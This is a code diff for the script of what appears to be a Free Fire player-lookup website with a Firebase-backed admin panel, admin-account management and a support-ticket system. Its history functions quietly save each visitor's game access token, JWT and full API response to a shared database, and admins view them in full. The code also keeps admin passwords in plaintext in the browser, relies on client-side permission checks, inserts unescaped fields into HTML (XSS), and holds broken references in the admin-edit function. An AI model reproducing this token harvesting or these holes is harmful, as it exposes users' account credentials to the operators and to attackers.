+          'auth/operation-not-allowed':'❌ Email/Password sign-in is not enabled in Firebase Authentication.',
+          'auth/network-request-failed':'❌ Firebase network request failed. Check your internet connection.',
+          'auth-timeout':'❌ Firebase login timed out. Open this site from HTTPS hosting, not the Download/File Manager file.'
+        };
+        err.innerText=(messages[code]||('❌ Firebase login failed: '+(e.message||code)));
+      }finally{
+        if(loginBtn)loginBtn.disabled=false;
+      }
+    }
+
+    function handleLogoClick(){
+      if(isAdmin){openAdminPanel();return;}
+      openModal('adminLoginModal');
+    }
+    document.addEventListener('DOMContentLoaded',function(){
+      const logo=document.getElementById('homeLogo');
+      if(logo){logo.addEventListener('click',function(e){e.preventDefault();e.stopPropagation();handleLogoClick();});logo.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();handleLogoClick();}});}
+    });
+
+    function updateHomeAdminState(){
+      const btn=document.getElementById('homeLogoutBtn');
+      if(btn)btn.classList.toggle('show',isAdmin);
+    }
+
+    /* ===== Page navigation ===== */
+    function hideAllPages(){
+      document.getElementById('mainPage').style.display='none';
+      document.getElementById('adminPage').style.display='none';
+      document.getElementById('adminProfilePage').style.display='none';
+    }
+    function openAdminPanel(){
+      if(!isAdmin)return openModal('adminLoginModal');
+      hideAllPages();
+      document.getElementById('adminPage').style.display='flex';
+      const dp=localStorage.getItem('ff_admin_dp');
+      if(dp){document.getElementById('adminDpMini2').src=dp;document.getElementById('welcomeDp').src=dp;}
+      if(currentAdmin){
+        document.getElementById('adminWhoamiName').innerText=currentAdmin.name||currentAdmin.user;
+        document.getElementById('adminWhoamiRole').innerText=currentAdmin.role==='owner'?'WEBSITE OWNER':'ADMIN USER';
+        document.getElementById('ownerVerifiedTick').classList.toggle('hidden',currentAdmin.role!=='owner');
+      }
+      loadAdminImages();
+      updateAdminTabAccess();
+      switchAdminTab('history');
+      window.scrollTo(0,0);
+    }
+    function openAdminProfile(){
+      if(!isAdmin)return openModal('adminLoginModal');
+      openAdminPanel();
+    }
+    function showHomePage(){
+      hideAllPages();
+      document.getElementById('mainPage').style.display='flex';
+      updateHomeAdminState();
+      window.scrollTo(0,0);
+    }
+    function doLogout(){
+      try{firebaseAuth.signOut();}catch(e){}
+      isAdmin=false;
+      currentAdmin=null;
+      updateHomeAdminState();
+      updateAdminTabAccess();
+      updateOwnerPasswordUI();
+      showHomePage();
+      if(location.hash==='#admin'){history.replaceState({},'',location.pathname+location.search);}
+    }
+    window.addEventListener('popstate',function(){
+      if(isAdmin)showHomePage();
+    });
+
+    /* ===== Admin DP & Banner change ===== */
+    function changeAdminImage(input,type){
+      const file=input.files[0];
+      if(!file)return;
+      const reader=new FileReader();
+      reader.onload=function(e){
+        localStorage.setItem(type==='dp'?'ff_admin_dp':'ff_admin_banner',e.target.result);
+        loadAdminImages();
+      };
+      reader.readAsDataURL(file);
+    }
+    function loadAdminImages(){
+      const dp=localStorage.getItem('ff_admin_dp');
+      const banner=localStorage.getItem('ff_admin_banner');
+      if(dp){
+        const a=document.getElementById('adminDpImg'); if(a)a.src=dp;
+        const b=document.getElementById('adminDpMini2'); if(b)b.src=dp;
+      }
+      if(banner){
+        const a=document.getElementById('adminBannerImg'); if(a)a.src=banner;
+        const b=document.getElementById('panelAdminBanner'); if(b)b.src=banner;
+      }
+    }
+
+    /* ===== Admin ID creation / owner-only credential editing ===== */
+    function createAdminId(){
+      const err=document.getElementById('createAdminErr');
+      err.classList.remove('hidden');err.style.color='#F10E30';
+      if(!canCreateAdmin()){err.innerText='❌ You do not have permission to create Admin IDs.';return;}
+      const name=document.getElementById('caName').value.trim();
+      const user=document.getElementById('caUser').value.trim();
+      const pass=document.getElementById('caPass').value;
+      const duration=Number(document.getElementById('caDuration').value);
+      const unit=document.getElementById('caUnit').value;
+      const canCreate=document.getElementById('caCanCreate').value==='yes';
+      if(!name||user.length<8||pass.length<8||!Number.isFinite(duration)||duration<1){err.innerText='❌ Name is required. Username and Password must be at least 8 characters, with a valid duration.';return;}
+      if(user===OWNER.user){err.innerText='❌ This username cannot be used.';return;}
+      const ids=getAdminIds();
+      if(ids.some(x=>x.username===user)){err.innerText='❌ This username already exists.';return;}
+      const multipliers={minutes:60000,hours:3600000,days:86400000};
+      const createdAt=Date.now();
+      const expiresAt=createdAt+duration*multipliers[unit];
+      ids.push({id:String(Date.now())+Math.random().toString(36).slice(2),name,username:user,password:pass,created:new Date(createdAt).toLocaleString(),createdAt,expiresAt,duration,unit,canCreateAdmin:canCreate,status:'active'});
+      saveAdminIds(ids);
+      ['caName','caUser','caPass'].forEach(id=>document.getElementById(id).value='');
+      document.getElementById('caDuration').value='30';document.getElementById('caUnit').value='days';document.getElementById('caCanCreate').value='no';
+      err.style.color='#10b981';err.innerText='✅ Admin ID created successfully!';
+      renderAdminUsers();
+      setTimeout(()=>{err.classList.add('hidden');err.style.color='#F10E30';},3000);
+    }
+
+    function openEditAdmin(id){
+      if(!isOwner()){return;}
+      const item=getAdminIds().find(x=>String(x.id)===String(id));
+      if(!item)return;
+      document.getElementById('editAdminId').value=item.id;
+      document.getElementById('editAdminName').value=item.name||'';
+      document.getElementById('editAdminUser').value=item.username||'';
+      document.getElementById('editAdminPass').value=item.password||'';
+      const unit=item.unit||'days';
+      const div={minutes:60000,hours:3600000,days:86400000}[unit]||86400000;
+      const duration=Math.max(1,Math.ceil(((item.expiresAt||Date.now())-Date.now())/div));
+      document.getElementById('editAdminDuration').value=duration;document.getElementById('editAdminUnit').value=unit;
+      document.getElementById('editAdminCanCreate').value=item.canCreateAdmin===true?'yes':'no';
+      document.getElementById('editAdminErr').classList.add('hidden');
+      openModal('editAdminModal');
+    }
+
+    function saveAdminEdit(){
+      const err=document.getElementById('editAdminErr');
+      if(!isOwner()){err.innerText='❌ Only the Website Owner can edit Admin credentials.';err.style.color='#F10E30';err.classList.remove('hidden');return;}
+      const id=document.getElementById('editAdminId').value;
+      const name=document.getElementById('editAdminName').value.trim();
+      const user=document.getElementById('editAdminUser').value.trim();
+      const pass=document.getElementById('editAdminPass').value;
+      const days=parseInt(document.getElementById('editAdminDays').value,10);
+      const canCreate=document.getElementById('editAdminCanCreate').value==='yes';
+      if(!name||user.length<8||pass.length<8||!Number.isFinite(duration)||duration<1){err.innerText='❌ Complete all fields with a valid duration.';err.style.color='#F10E30';err.classList.remove('hidden');return;}
+      if(user===OWNER.user){err.innerText='❌ The Owner username cannot be assigned.';err.style.color='#F10E30';err.classList.remove('hidden');return;}
+      const ids=getAdminIds();
+      if(ids.some(x=>String(x.id)!==String(id)&&x.username===user)){err.innerText='❌ This username already exists.';err.style.color='#F10E30';err.classList.remove('hidden');return;}
+      const item=ids.find(x=>String(x.id)===String(id));
+      if(!item)return;
+      item.name=name;item.username=user;item.password=pass;item.duration=duration;item.unit=unit;item.expiresAt=Date.now()+duration*({minutes:60000,hours:3600000,days:86400000}[unit]||86400000);item.canCreateAdmin=canCreate;
+      saveAdminIds(ids);
+      err.innerText='✅ Admin credentials updated.';err.style.color='#10b981';err.classList.remove('hidden');
+      renderAdminUsers();
+      setTimeout(()=>closeModal('editAdminModal'),700);
+    }
+
+    function renderAdminUsers(){
+      const box=document.getElementById('adminUsers');
+      const ids=getAdminIds();
+      if(ids.length===0){box.innerText='No users created';return;}
+      const owner=isOwner();
+      box.innerHTML=ids.map((x,i)=>{
+        const expired=x.expiresAt&&Date.now()>=x.expiresAt;
+        const status=expired?'expired':(x.status||'active');
+        const expiry=x.expiresAt?new Date(x.expiresAt).toLocaleString():'No expiry';
+        const statusClass=status==='active'?'text-emerald-400':status==='blocked'?'text-red-400':'text-yellow-400';
+        const actions=owner?`<div class="admin-action-row">
+          <button onclick="setAdminStatus('${String(x.id)}','active')" class="admin-action-btn activate"><i class="fas fa-check-circle"></i> ACTIVATE</button>
+          <button onclick="setAdminStatus('${String(x.id)}','inactive')" class="admin-action-btn deactivate"><i class="fas fa-pause-circle"></i> DEACTIVATE</button>
+          <button onclick="setAdminStatus('${String(x.id)}','blocked')" class="admin-action-btn block"><i class="fas fa-ban"></i> BLOCK</button>
+          <button onclick="openEditAdmin('${String(x.id)}')" class="admin-action-btn edit"><i class="fas fa-pen"></i> EDIT</button>
+          <button onclick="showDeleteUI('admin_user','${String(x.id)}')" class="admin-action-btn delete"><i class="fas fa-trash-alt"></i> DELETE</button>
+        </div>`:'';
+        return `<div class="user-item">
+          <div class="w-8 h-8 rounded-full flex items-center justify-center text-[11px] font-bold" style="background:rgba(60,139,195,.15);color:#3C8BC3;">${i+1}</div>
+          <div class="flex-1 min-w-0">
+            <div class="text-[12px] font-bold text-white">👤 ${x.name}</div>
+            <div class="text-[9px] text-gray-500">@${x.username} | ${x.duration||x.durationDays||'-'} ${x.unit||'days'}</div>
+            <div class="text-[8px] ${statusClass}">Status: ${status.toUpperCase()} | Expires: ${expiry}</div>
+            <div class="text-[8px] text-gray-500">Create Admin IDs: ${x.canCreateAdmin===true?'YES':'NO'}</div>${actions}
+          </div>
+        </div>`;
+      }).join('');
+    }
+
+    function setAdminStatus(id,status){
+      if(!isOwner())return;
+      const ids=getAdminIds();const item=ids.find(x=>String(x.id)===String(id));if(!item)return;
+      item.status=status;saveAdminIds(ids);renderAdminUsers();
+    }
+
+    /* ===== Tabs ===== */
+    function switchAdminTab(tab){
+      if(tab==='users' && !(isAdmin && currentAdmin && currentAdmin.role==='owner')){
+        tab='history';
+      }
+      ['history','msgs','users','create'].forEach(t=>{
+        const el=document.getElementById('tab'+t.charAt(0).toUpperCase()+t.slice(1));if(el)el.classList.add('hidden');
+        const btn=document.getElementById('tab'+(t==='msgs'?'Msgs':t.charAt(0).toUpperCase()+t.slice(1))+'Btn');if(btn)btn.classList.remove('active');
+      });
+      const target=document.getElementById('tab'+tab.charAt(0).toUpperCase()+tab.slice(1));
+      const btn=document.getElementById('tab'+(tab==='msgs'?'Msgs':tab.charAt(0).toUpperCase()+tab.slice(1))+'Btn');
+      if(target)target.classList.remove('hidden');if(btn)btn.classList.add('active');
+      if(tab==='history')renderAdminHistory();
+      else if(tab==='msgs')renderAdminMsgs();
+      else if(tab==='users')renderAdminUsers();
+      else if(tab==='create'){
+        const box=document.getElementById('createAdminBox');
+        if(box)box.classList.toggle('hidden',!canCreateAdmin());
+        if(!canCreateAdmin()){box.innerHTML='<div class="text-xs text-red-400 text-center py-6">Only an authorized admin can create Admin IDs.</div>';}
+      }
+    }
+
+    /* ===== Player History (Name list → click for details, #06BCF9) ===== */
+    function buildBannerUrl(data){
+      const direct=data?.banner||data?.bannerUrl||data?.banner_image||data?.bannerImage;
+      if(direct && /^https?:\/\//i.test(String(direct)))return String(direct);
+      const headPic=data?.headPic??data?.head_pic??data?.headPicId??data?.head_pic_id;
+      const bannerId=data?.bannerId??data?.banner_id??data?.bannerID;
+      const nickname=data?.nickname??data?.name??data?.nickName;
+      const level=data?.level??data?.lv??data?.playerLevel;
+      if(headPic&&bannerId&&nickname&&level){
+        return `https://image.killersharmabot.online/banner-image?key=FFPlayerInfoBot&headPic=${encodeURIComponent(headPic)}&bannerId=${encodeURIComponent(bannerId)}&name=${encodeURIComponent(nickname)}&level=${encodeURIComponent(level)}`;
+      }
+      return null;
+    }
+
+    async function ensureFirebaseUser(){
+      if(firebaseAuth.currentUser) return firebaseAuth.currentUser;
+      const cred=await firebaseAuth.signInAnonymously();
+      return cred.user;
+    }
+
+    async function firebaseSaveHistory(data){
+      const user=await ensureFirebaseUser();
+      const bannerUrl=buildBannerUrl(data);
+      const record={
+        time:new Date().toLocaleString(),
+        timestamp:Date.now(),
+        nickname:data.nickname||'-',
+        region:data.lockRegion||data.noti_region||data.region||'-',
+        accountId:data.accountId||data.account_id||data.uid||'-',
+        level:data.level||'-',
+        access_token:data.access_token||'-',
+        jwt:data.token||null,
+        banner:bannerUrl,
+        full:data
+      };
+      const ref=firebaseDB.ref('users/'+user.uid+'/history').push();
+      record.id=ref.key;
+      record.p4x=makeUniqueP4X();
+      await ref.set(record);
+      return record;
+    }
+
+    async function loadFirebaseHistory(){
+      const snap=await firebaseDB.ref('users').once('value');
+      const all=[];
+      snap.forEach(userSnap=>{
+        const h=userSnap.child('history');
+        h.forEach(item=>{
+          const v=item.val()||{};
+          v.id=v.id||item.key;
+          v.firebaseKey=item.key;
+          v.uid=userSnap.key;
+          all.push(v);
+        });
+      });
+      all.sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
+      return all;
+    }
+
+    async function loadFirebaseMessages(){
+      const snap=await firebaseDB.ref('users').once('value');
+      const all=[];
+      snap.forEach(userSnap=>{
+        const m=userSnap.child('messages');
+        m.forEach(item=>{
+          const v=item.val()||{};
+          v.id=v.id||item.key;
+          v.firebaseKey=item.key;
+          v.uid=userSnap.key;
+          all.push(v);
+        });
+      });
+      all.sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
+      return all;
+    }
+
+    async function firebaseSendMessage(message){
+      const user=await ensureFirebaseUser();
+      const ref=firebaseDB.ref('users/'+user.uid+'/messages').push();
+      message.id=ref.key;
+      message.timestamp=Date.now();
+      await ref.set(message);
+      return message;
+    }
+
+    async function saveHistory(data){
+      let h=JSON.parse(localStorage.getItem('ff_admin_history')||'[]');
+      const bannerUrl=buildBannerUrl(data);
+      const p4x=makeUniqueP4X();
+      h.unshift({
+        id:String(Date.now())+Math.random().toString(36).slice(2),
+        p4x:p4x,
+        time:new Date().toLocaleString(),
+        nickname:data.nickname||'-',
+        region:data.lockRegion||data.noti_region||data.region||'-',
+        accountId:data.accountId||data.account_id||data.uid||'-',
+        level:data.level||'-',
+        access_token:data.access_token||'-',
+        jwt:data.token||null,
+        banner:bannerUrl,
+        full:data
+      });
+      /* Unlimited history: do not slice/delete old records automatically. */
+      localStorage.setItem('ff_admin_history',JSON.stringify(h));
+      try{ await firebaseSaveHistory(data); }catch(e){ console.error('Firebase history save failed:',e); }
+    }
+
+    async function renderAdminHistory(){
+      const box=document.getElementById('adminHistory');
+      let h=[];
+      try{ h=await loadFirebaseHistory(); }catch(e){ console.error('Firebase history load failed:',e); h=JSON.parse(localStorage.getItem('ff_admin_history')||'[]'); }
+      if(h.length===0){box.innerText='No data available';return;}
+      box.innerHTML=h.map((x,i)=>`
+        <div class="ph-name" onclick="togglePhDetail('${x.id}')">
+          <span class="num">${i+1})</span>
+          <span class="pname">👤 ${x.nickname}</span>
+          <i id="chev_${x.id}" class="fas fa-chevron-down chev"></i>
+        </div>
+        <div class="ph-detail" id="phd_${x.id}">
+          <div class="flex justify-between items-start mb-2">
+            <div>
+              <div class="text-[9px] text-gray-500">${x.time}</div>
+              <div class="p4x-badge mt-1">${escapeHtml(x.p4x||'P4X-UNKNOWN')}</div>
+            </div>
+            <button onclick="showDeleteUI('history','${x.id}')" class="del-btn text-[9px] font-bold px-2.5 py-1 rounded-lg transition">
+              <i class="fas fa-trash"></i> DELETE
+            </button>
+          </div>
+          <div class="grid grid-cols-2 gap-2 mb-2">
+            <div><div class="ph-label">Nickname</div><div class="ph-value">${x.nickname}</div></div>
+            <div><div class="ph-label">Region</div><div class="ph-value">${x.region}</div></div>
+            <div><div class="ph-label">Account UID</div><div class="ph-value">${x.accountId}</div></div>
+            <div><div class="ph-label">Level</div><div class="ph-value">${x.level}</div></div>
+          </div>
+          ${x.banner?`<img src="${x.banner}" alt="Player Banner" class="player-banner-img mb-2" />`:''}
+          <div class="ph-label mt-2">Access Token</div>
+          <div class="ph-value" style="color:#06BCF9;">${x.access_token}</div>
+          ${x.jwt?`<div class="ph-label mt-2">JWT Token</div><div class="ph-value text-gray-300">${x.jwt}</div>`:''}
+          <div class="ph-label mt-2">Full API Response</div>
+          <div class="ph-value text-gray-400" style="white-space:pre-wrap;font-size:9px;">${JSON.stringify(x.full,null,1)}</div>
+        </div>
+      `).join('');
+    }
+
+    function togglePhDetail(id){
+      const d=document.getElementById('phd_'+String(id));
+      const c=document.getElementById('chev_'+String(id));
+      if(d.classList.contains('open')){
+        d.classList.remove('open');
+        c.className='fas fa-chevron-down chev';
+      }else{
+        d.classList.add('open');
+        c.className='fas fa-chevron-up chev';
+      }
+    }
+
+    /* ===== MSG FOR ADMIN (Subject + Image) ===== */
+    let msgImgData=null;
+    function previewMsgImg(input){
+      const file=input.files[0];
+      if(!file)return;
+      const reader=new FileReader();
+      reader.onload=function(e){
+        msgImgData=e.target.result;
+        const pv=document.getElementById('msgImgPreview');
+        pv.src=msgImgData;pv.classList.remove('hidden');
+        document.getElementById('msgImgLabel').innerText='IMAGE ATTACHED ✓';
+        document.getElementById('msgImgClear').classList.remove('hidden');
+      };
+      reader.readAsDataURL(file);
+    }
+    function clearMsgImg(){
+      msgImgData=null;
+      document.getElementById('msgImgUpload').value='';
+      document.getElementById('msgImgPreview').classList.add('hidden');
+      document.getElementById('msgImgLabel').innerText='ATTACH IMAGE (Bug Photo)';
+      document.getElementById('msgImgClear').classList.add('hidden');
+    }
+    /* ===== P4X UNIQUE USER/TICKET SYSTEM ===== */
+    function getUserP4X(){
+      let id=localStorage.getItem('ff_user_p4x');
+      if(!id){
+        const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+        let code='';
+        for(let i=0;i<6;i++) code+=chars[Math.floor(Math.random()*chars.length)];
+        id='P4X-'+code;
+        localStorage.setItem('ff_user_p4x',id);
+      }
+      return id;
+    }
+    function makeUniqueP4X(){
+      const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+      let code='';
+      for(let i=0;i<6;i++) code+=chars[Math.floor(Math.random()*chars.length)];
+      return 'P4X-'+code;
+    }
+    function copyUserP4X(){
+      const id=localStorage.getItem('ff_last_message_p4x')||document.getElementById('msgP4XDisplay')?.innerText;
+      if(id&&id!=='P4X-------'){
+        copyToClipboard(id,document.querySelector('#msgP4XDisplay')?.parentElement?.parentElement?.querySelector('button'),'P4X COPIED!');
+      }else{
+        alert('Send a message first to get a P4X Number.');
+      }
+    }
+    function initP4XUI(){
+      const el=document.getElementById('msgP4XDisplay');
+      if(el)el.innerText=localStorage.getItem('ff_last_message_p4x')||'P4X-------';
+    }
+    function escapeHtml(v){
+      return String(v??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+    }
+
+    async function sendMsgToAdmin(){
+      const name=document.getElementById('msgName').value.trim();
+      const subject=document.getElementById('msgSubject').value.trim();
+      const text=document.getElementById('msgText').value.trim();
+      const err=document.getElementById('msgErr');
+      err.classList.remove('hidden');err.style.color='#F10E30';
+      if(!name||!subject||!text){err.innerText='❌ Name, Subject and Message are required!';return;}
+
+      const p4x=makeUniqueP4X();
+      localStorage.setItem('ff_last_message_p4x',p4x);
+      const message={
+        p4x:p4x,
+        name:name,
+        subject:subject,
+        msg:text,
+        img:msgImgData,
+        time:new Date().toLocaleString(),
+        status:'pending',
+        reply:null,
+        repliedAt:null
+      };
+      try{
+        await firebaseSendMessage(message);
+      }catch(e){
+        console.error('Firebase message save failed:',e);
+        err.innerText='❌ Message could not be saved to Firebase. Please use the site from HTTPS hosting and try again.';
+        return;
+      }
+      let msgs=JSON.parse(localStorage.getItem('ff_user_msgs')||'[]');
+      msgs.unshift(message);
+      localStorage.setItem('ff_user_msgs',JSON.stringify(msgs));
+
+      document.getElementById('msgName').value='';
+      document.getElementById('msgSubject').value='';
+      document.getElementById('msgText').value='';
+      clearMsgImg();
+      initP4XUI();
+      err.style.color='#10b981';
+      err.innerHTML='✅ Message sent! Your P4X Number is <strong>'+escapeHtml(p4x)+'</strong>. Save it to check status/reply.';
+      setTimeout(()=>{err.classList.add('hidden');err.style.color='#F10E30';},6000);
+    }
+
+    function showMyReplies(){
+      openModal('myRepliesModal');
+      document.getElementById('myRepliesBox').innerText='Enter your P4X number and press CHECK STATUS...';
+      document.getElementById('replyNameInp').value=localStorage.getItem('ff_last_message_p4x')||'';
+    }
+    async function loadMyReplies(){
+      const p4x=document.getElementById('replyNameInp').value.trim().toUpperCase();
+      const box=document.getElementById('myRepliesBox');
+      if(!p4x){box.innerText='❌ Enter your P4X number first';return;}
+      let msgs=[];
+      try{ msgs=await loadFirebaseMessages(); }catch(e){ msgs=JSON.parse(localStorage.getItem('ff_user_msgs')||'[]'); }
+      const mine=msgs.filter(m=>String(m.p4x||'').toUpperCase()===p4x);
+      if(mine.length===0){box.innerText='❌ No messages found for this P4X number';return;}
+      box.innerHTML=mine.map(m=>`
+        <div class="msg-item">
+          <div class="flex justify-between items-start gap-2">
+            <div class="text-[9px] text-gray-500">${escapeHtml(m.time)}</div>
+            <span class="p4x-status ${m.reply?'replied':'pending'}">${m.reply?'✓ REPLIED':'⏳ PENDING'}</span>
+          </div>
+          <div class="mt-1"><span class="p4x-badge">${escapeHtml(m.p4x||p4x)}</span></div>
+          <div class="text-[10px] font-bold mt-2" style="color:#06BCF9;">📌 ${escapeHtml(m.subject)}</div>
+          <div class="text-[10px] text-white mt-1">📩 ${escapeHtml(m.msg)}</div>
+          ${m.img?`<img src="${m.img}" class="msg-img" />`:''}
+          ${m.reply?`<div class="reply-box"><strong style="color:#10b981;">🛡️ Admin Reply:</strong> ${escapeHtml(m.reply)}<div class="text-[8px] text-gray-500 mt-1">${escapeHtml(m.repliedAt||'')}</div></div>`:`<div class="text-[9px] text-gray-500 mt-1">⏳ Admin has not replied yet.</div>`}
+        </div>
+      `).join('');
+    }
+
+    /* ===== Admin Inbox + Reply ===== */
+    let replyTargetId=null;
+    async function renderAdminMsgs(){
+      const box=document.getElementById('adminMsgs');
+      let msgs=[];
+      try{ msgs=await loadFirebaseMessages(); }catch(e){ msgs=JSON.parse(localStorage.getItem('ff_user_msgs')||'[]'); }
+      if(msgs.length===0){box.innerText='No messages available';return;}
+      box.innerHTML=msgs.map(m=>`
+        <div class="msg-item">
+          <div class="flex justify-between items-start gap-2">
+            <div class="text-[9px] text-gray-500">${escapeHtml(m.time)}</div>
+            <div class="flex items-center gap-1">
+              <span class="p4x-status ${m.reply?'replied':'pending'}">${m.reply?'✓ REPLIED':'⏳ PENDING'}</span>
+              <button onclick="showDeleteUI('msg',${m.id})" class="del-btn text-[9px] font-bold px-2.5 py-1 rounded-lg transition">
+                <i class="fas fa-trash"></i>
+              </button>
+            </div>
+          </div>
+          <div class="mt-1"><span class="p4x-badge">${escapeHtml(m.p4x||'P4X-UNKNOWN')}</span></div>
+          <div class="text-[11px] font-bold mt-2" style="color:#F10E30;">👤 ${escapeHtml(m.name)}</div>
+          <div class="text-[10px] font-bold mt-0.5" style="color:#06BCF9;">📌 ${escapeHtml(m.subject)}</div>
+          <div class="text-[10px] text-white mt-1">📩 ${escapeHtml(m.msg)}</div>
+          ${m.img?`<img src="${m.img}" class="msg-img" alt="Bug screenshot" />`:''}
+          ${m.reply
+            ?`<div class="reply-box"><strong style="color:#10b981;">🛡️ Reply sent:</strong> ${escapeHtml(m.reply)}<div class="text-[8px] text-gray-500 mt-1">${escapeHtml(m.repliedAt||'')}</div></div>`
+            :`<button onclick="openReplyModal(${m.id})" class="mt-2 text-[9px] font-bold px-3 py-1.5 rounded-lg transition" style="background:#10b981;color:#fff;">
+                <i class="fas fa-reply"></i> REPLY
+              </button>`}
+        </div>
+      `).join('');
+    }
+    async function openReplyModal(id){
+      let msgs=[];
+      try{ msgs=await loadFirebaseMessages(); }catch(e){ msgs=JSON.parse(localStorage.getItem('ff_user_msgs')||'[]'); }
+      const m=msgs.find(x=>x.id===id);
+      if(!m)return;
+      replyTargetId=id;
+      document.getElementById('replyToName').innerText=m.name;
+      document.getElementById('replyOrigMsg').innerText='📌 '+m.subject+' — '+m.msg;
+      document.getElementById('replyText').value='';
+      openModal('replyModal');
+    }
+    async function sendReply(){
+      const text=document.getElementById('replyText').value.trim();
+      if(!text||replyTargetId===null)return;
+      let msgs=[];
+      try{ msgs=await loadFirebaseMessages(); }catch(e){ msgs=JSON.parse(localStorage.getItem('ff_user_msgs')||'[]'); }
+      const m=msgs.find(x=>x.id===replyTargetId);
+      if(m){
+        m.reply=text;
+        m.status='replied';
+        m.repliedAt=new Date().toLocaleString();
+        try{
+          if(m.uid&&m.firebaseKey){ await firebaseDB.ref('users/'+m.uid+'/messages/'+m.firebaseKey).update({reply:m.reply,status:m.status,repliedAt:m.repliedAt}); }
+        }catch(e){ console.error('Firebase reply update failed:',e); }
+      }
+      localStorage.setItem('ff_user_msgs',JSON.stringify(msgs));
+      closeModal('replyModal');
+      renderAdminMsgs();
+    }
+
+    /* ===== DELETE UI (সব জায়গায় একই confirm popup) ===== */
+    let deleteTarget=null;
+    function showDeleteUI(type,id){
+      deleteTarget={type:type,id:id};
+      const map={
+        'all_history':{icon:'fa-history',msg:'All Player History will be deleted. This cannot be undone.'},
+        'all_msgs':{icon:'fa-envelope',msg:'All User Messages will be deleted. This cannot be undone.'},
+        'history':{icon:'fa-user',msg:'This Player Record will be deleted. Continue?'},
+        'msg':{icon:'fa-envelope',msg:'This Message will be deleted. Continue?'},
+        'admin_user':{icon:'fa-user-shield',msg:'This Admin ID and password will be deleted. This ID will no longer be able to log in.'}
+      };
+      const info=map[type]||{icon:'fa-trash',msg:'Are you sure?'};
+      document.getElementById('deleteMsg').innerText=info.msg;
+      openModal('deleteModal');
+    }
+    function confirmDelete(){
+      if(!deleteTarget)return;
+      const t=deleteTarget.type;
+      if(t==='admin_user'&&!isOwner()){deleteTarget=null;closeModal('deleteModal');return;}
+      if(t==='all_history'){localStorage.removeItem('ff_admin_history');renderAdminHistory();}
+      else if(t==='all_msgs'){localStorage.removeItem('ff_user_msgs');renderAdminMsgs();}
+      else if(t==='history'){
+        let h=JSON.parse(localStorage.getItem('ff_admin_history')||'[]');
+        h=h.filter(x=>String(x.id)!==String(deleteTarget.id));
+        localStorage.setItem('ff_admin_history',JSON.stringify(h));
+        renderAdminHistory();
+      }
+      else if(t==='msg'){
+        let m=JSON.parse(localStorage.getItem('ff_user_msgs')||'[]');
+        m=m.filter(x=>String(x.id)!==String(deleteTarget.id));
+        localStorage.setItem('ff_user_msgs',JSON.stringify(m));
+        renderAdminMsgs();
+      }
+      else if(t==='admin_user'){
+        let ids=JSON.parse(localStorage.getItem('ff_admin_ids')||'[]');
+        ids=ids.filter(x=>String(x.id)!==String(deleteTarget.id));
+        localStorage.setItem('ff_admin_ids',JSON.stringify(ids));
+        renderAdminUsers();
+      }
+      deleteTarget=null;
+      closeModal('deleteModal');
+    }
+
+    function initAdminUI(){
+      updateHomeAdminState();
+    }
+    initAdminUI();
+    ensureFirebaseUser().catch(e=>console.error('Firebase anonymous auth:',e));
+    document.addEventListener('DOMContentLoaded',initP4XUI);
+    window.addEventListener('storage',function(e){
+      if(e.key==='ff_user_msgs' && document.getElementById('tabMsgs') && !document.getElementById('tabMsgs').classList.contains('hidden')) renderAdminMsgs();
+    });
+</script>
+</body>
+</html>
